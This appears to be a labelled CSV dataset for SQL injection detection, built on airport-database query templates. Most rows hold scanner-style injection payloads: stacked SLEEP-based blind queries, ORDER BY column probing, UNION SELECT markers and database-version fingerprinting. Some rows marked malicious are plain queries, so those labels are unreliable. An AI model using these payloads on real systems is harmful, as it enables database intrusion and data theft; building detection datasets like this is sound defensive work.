full_query,label,template_id,malicious_input,malicious_input_desc
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((95=93),SLEEP(5),5932)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((93=93),SLEEP(5),8955)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((95 93),SLEEP(5),7313)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((32=32),SLEEP(5),6007)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((32=51),SLEEP(5),6449)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((32=52),SLEEP(5),3615)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((52=51),SLEEP(5),7039)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((51=51),SLEEP(5),7092)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((52 51),SLEEP(5),5040)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((61=61),SLEEP(5),9356)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((61=73),SLEEP(5),5764)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((61=78),SLEEP(5),2328)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((78=73),SLEEP(5),5884)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((73=73),SLEEP(5),9356)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((78 73),SLEEP(5),8181)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((25=25),SLEEP(5),8596)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((25=48),SLEEP(5),5932)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((25=93),SLEEP(5),1236)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((93=48),SLEEP(5),1326)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((48=48),SLEEP(5),4874)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((93 48),SLEEP(5),8227)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((15=15),SLEEP(5),3490)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((15=22),SLEEP(5),7727)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((15=89),SLEEP(5),5772)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((89=22),SLEEP(5),1534)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((22=22),SLEEP(5),4741)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((89 22),SLEEP(5),9297)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((3996=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                3996),SLEEP(5),4217)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((5693>5692),SLEEP(5),4556)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),6164)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),8530)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),9865)#""",1,airport-S3,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),5883)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),2360)#""",1,airport-S3,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1,"",,)))'),"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),9915)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((@@VERSION_COMMENT LIKE 0x25506572636f6e6125),SLEEP(1),8294)#""",1,airport-S3,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1'KqSqvi<'"">jxfCgO"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((AURORA_VERSION() LIKE 0x25),SLEEP(1),1251)#""",1,airport-S3,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((9768=9768/* NoValue */),SLEEP(1),9768)#""",1,airport-S3,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1) ORDER BY 1-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((5358=5358/*!80300 AND 2927=2402*/),SLEEP(1),5358)#""",1,airport-S3,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1) ORDER BY 9934-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT icao_code, iata_code, local_code FROM airport WHERE name LIKE ""BucksAirport"";SELECT IF((4529=4529/*!80302 AND 8068=2235*/),SLEEP(1),4529)#""",1,airport-S3,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1 ORDER BY 1-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1 ORDER BY 9081-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1') ORDER BY 1-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1') ORDER BY 2001-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1' ORDER BY 1-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1' ORDER BY 3763-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1 ORDER BY 1-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1 ORDER BY 5293-- -"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1) ORDER BY 1#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1) ORDER BY 6944#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1') ORDER BY 1#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1') ORDER BY 7136#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1' ORDER BY 1#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1' ORDER BY 8121#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 1#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 5457#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 10#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 20#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 15#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 18#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" ORDER BY 19#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,0x684d784d4b42526e74437249765278436b72565745484661474c555973765646754342594e6b666c,0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,0x684d784d4b42526e74437249765278436b72565745484661474c555973765646754342594e6b666c,0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,0x49674c72584e70594a5a586d58494661564d74637162425a796254557758566c634466666f6a6b68,0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,0x684d784d4b42526e74437249765278436b72565745484661474c555973765646754342594e6b666c,0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM (SELECT 0 AS xWUs UNION SELECT 1 UNION SELECT 2 UNION SELECT 3 UNION SELECT 4 UNION SELECT 5 UNION SELECT 6 UNION SELECT 7 UNION SELECT 8 UNION SELECT 9 UNION SELECT 10 UNION SELECT 11 UNION SELECT 12 UNION SELECT 13 UNION SELECT 14) AS ThrG#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (9857=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                9857) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (DATABASE() LIKE SCHEMA()) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (VERSION() LIKE 0x254d61726961444225) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (VERSION() LIKE 0x255469444225) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (@@VERSION_COMMENT LIKE 0x256472697a7a6c6525) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (@@VERSION_COMMENT LIKE 0x25506572636f6e6125) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x71766a7171,(CASE WHEN (AURORA_VERSION() LIKE 0x25) THEN 1 ELSE 0 END),0x716b706b71),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1'))""(),)))"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1'DlAcSK<'"">aKSMzu"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1);SELECT SLEEP(5)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1');SELECT SLEEP(5)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1';SELECT SLEEP(5)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT SLEEP(5)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT SLEEP(0)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT SLEEP(5)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((13=13),SLEEP(5),7773)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((13=48),SLEEP(5),8821)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((13=97),SLEEP(5),4642)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((97=48),SLEEP(5),1507)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((48=48),SLEEP(5),9575)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((97 48),SLEEP(5),4636)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((27=27),SLEEP(5),1175)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((27=74),SLEEP(5),1191)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((27=82),SLEEP(5),1863)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((82=74),SLEEP(5),7210)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((74=74),SLEEP(5),8484)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((82 74),SLEEP(5),9104)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((34=34),SLEEP(5),9794)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((34=49),SLEEP(5),2872)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((34=61),SLEEP(5),1604)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((61=49),SLEEP(5),7521)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((49=49),SLEEP(5),4817)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((61 49),SLEEP(5),3643)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((53=53),SLEEP(5),2264)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((53=63),SLEEP(5),5120)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((53=98),SLEEP(5),6759)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((98=63),SLEEP(5),3748)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((63=63),SLEEP(5),6054)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((98 63),SLEEP(5),7998)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((31=31),SLEEP(5),7630)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((31=71),SLEEP(5),3252)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((31=100),SLEEP(5),1725)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((100=71),SLEEP(5),5542)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((71=71),SLEEP(5),7309)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((100 71),SLEEP(5),4612)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((5463=                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                5463),SLEEP(5),6588)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((3472>3471),SLEEP(5),4168)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((QUARTER(NULL XOR NULL) IS NULL),SLEEP(5),3246)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((SESSION_USER() LIKE USER()),SLEEP(5),7419)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((ISNULL(JSON_STORAGE_FREE(NULL))),SLEEP(5),5767)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((VERSION() LIKE 0x254d61726961444225),SLEEP(1),9129)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((VERSION() LIKE 0x255469444225),SLEEP(1),7611)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
"SELECT * FROM airport WHERE gps_code = ""8VA1"";SELECT IF((@@VERSION_COMMENT LIKE 0x256472697a7a6c6525),SLEEP(1),7807)#"" OR local_code = ""MS0549""",1,airport-S4,Unknown,Unknown
